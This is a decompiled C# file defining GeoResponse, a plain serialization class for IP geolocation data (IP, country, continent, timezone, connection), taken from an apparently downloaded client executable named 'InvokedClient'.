// Decompiled with JetBrains decompiler
// Type: InvokedClient.IpGeoLocation.GeoResponse
// Assembly: Client, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79DD3210-3359-47C5-932E-9352F2CB8134
// Assembly location: C:\Users\ian\Downloads\Telegram Desktop\fein\client.exe

using System.Runtime.Serialization;


namespace InvokedClient.IpGeoLocation
{
	[DataContract]
	public class GeoResponse
	{
		[DataMember(Name = "ip")]
		public string Ip { get; set; }

		[DataMember(Name = "continent_code")]
		public string ContinentCode { get; set; }

		[DataMember(Name = "country")]
		public string Country { get; set; }

		[DataMember(Name = "country_code")]
		public string CountryCode { get; set; }

		[DataMember(Name = "timezone")]
		public Time Timezone { get; set; }

		[DataMember(Name = "connection")]
		public Conn Connection { get; set; }
	}
}